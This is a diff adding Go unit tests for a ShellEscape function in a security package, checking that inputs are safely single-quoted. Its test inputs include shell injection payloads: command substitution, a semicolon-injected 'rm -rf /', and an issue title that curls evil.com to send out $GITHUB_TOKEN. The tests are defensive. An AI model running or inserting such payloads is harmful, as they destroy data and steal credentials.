@@ -2,6 +2,79 @@ package security
 
 import "testing"
 
+func TestShellEscape(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{
+			name:  "simple string",
+			input: "hello world",
+			want:  "'hello world'",
+		},
+		{
+			name:  "empty string",
+			input: "",
+			want:  "''",
+		},
+		{
+			name:  "interior single quote",
+			input: "it's a test",
+			want:  `'it'\''s a test'`,
+		},
+		{
+			name:  "multiple single quotes",
+			input: "it's a 'test'",
+			want:  `'it'\''s a '\''test'\'''`,
+		},
+		{
+			name:  "command substitution dollar",
+			input: "$(whoami)",
+			want:  "'$(whoami)'",
+		},
+		{
+			name:  "command substitution backtick",
+			input: "`id`",
+			want:  "'`id`'",
+		},
+		{
+			name:  "semicolon injection",
+			input: `"; rm -rf /`,
+			want:  `'"; rm -rf /'`,
+		},
+		{
+			name:  "pipe and ampersand",
+			input: "foo | bar & baz",
+			want:  "'foo | bar & baz'",
+		},
+		{
+			name:  "all POSIX metacharacters",
+			input: `|&;$` + "`" + `\!(){}[]<>*?~#`,
+			want:  `'|&;$` + "`" + `\!(){}[]<>*?~#'`,
+		},
+		{
+			name:  "realistic malicious issue title",
+			input: `Fix bug $(curl http://evil.com/steal?token=$GITHUB_TOKEN)`,
+			want:  `'Fix bug $(curl http://evil.com/steal?token=$GITHUB_TOKEN)'`,
+		},
+		{
+			name:  "newline in content",
+			input: "line1\nline2",
+			want:  "'line1\nline2'",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := ShellEscape(tt.input)
+			if got != tt.want {
+				t.Errorf("ShellEscape(%q) = %q, want %q", tt.input, got, tt.want)
+			}
+		})
+	}
+}
+
 func TestContainsShellMetachars(t *testing.T) {
 	tests := []struct {
 		input string
